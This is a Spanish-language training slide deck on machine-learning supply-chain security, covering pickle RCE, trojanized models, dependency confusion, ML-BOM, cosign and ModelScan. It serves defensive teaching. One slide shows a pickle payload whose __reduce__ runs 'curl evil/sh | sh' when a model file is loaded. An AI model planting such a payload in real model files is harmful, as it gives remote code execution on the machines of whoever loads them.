---
marp: true
theme: gaia
class: invert
paginate: true
header: 'SecuAI · Módulo 5'
footer: 'Supply Chain ML & MLBOM'
---

<!-- _class: lead invert -->

# **Supply Chain ML** & MLBOM

Módulo 5 · SecuAI

Pickle RCE · HuggingFace · Sigstore · ModelScan

---

## La cadena de suministro ML

```
Dataset → Framework → Modelo base → Fine-tune → Pesos → Registry → Inferencia
   ⚠         ⚠          ⚠              ⚠           ⚠         ⚠         ⚠
```

Cada flecha = oportunidad de inyectar código.

---

## Pickle RCE

```python
class Evil:
    def __reduce__(self):
        return (os.system, ("curl evil/sh | sh",))

pickle.dump(Evil(), open("model.pt", "wb"))
```

`torch.load`, `joblib.load`, `keras` (.h5) → todos vulnerables.

→ **safetensors** o `weights_only=True` (PyTorch 2.4+).

---

## Modelos troyanizados en HuggingFace

- PoisonGPT (Mithril, 2023): GPT-J fine-tuned para desinformar.
- 100+ modelos con pickle RCE detectados por Protect AI.
- Typosquatting de organizaciones.

→ Allowlist por hash, mirror interno, ModelScan en CI.

---

## Dependency confusion (PyPI)

Atacante publica `numpy-cuda12` falso, dev internal lo escribe por error → RCE.

→ Lock files con hashes, `--require-hashes`, mirror privado.

---

## ML-BOM (CycloneDX 1.5)

```json
{
  "type": "machine-learning-model",
  "name": "fraud-detector",
  "hashes": [{"alg": "SHA-256", "content": "..."}],
  "modelCard": {...}
}
```

→ Requisito EU AI Act + ISO 42001.

---

## Firma con cosign (Sigstore)

```bash
cosign sign-blob --bundle m.bundle model.safetensors
cosign verify-blob \
  --bundle m.bundle \
  --certificate-identity-regexp ".*@miempresa\.com" \
  model.safetensors
```

Keyless OIDC = sin gestionar claves.

---

## ModelScan

```bash
modelscan -p ./model.pt
```

Detecta `os.system`, `subprocess`, `eval`, `__reduce__` sospechoso.

CI: fallar el pipeline si `issues_count > 0`.

---

## Receta supply chain segura

1. Solo safetensors
2. Mirror interno + index lock
3. ModelScan en CI
4. ML-BOM por release
5. Cosign sign + verify
6. Hash pinning en código
7. Audit log

---

<!-- _class: lead invert -->

## Lab

Construir modelo malicioso + defenderse

→ `Modulo5/ejercicio.md`
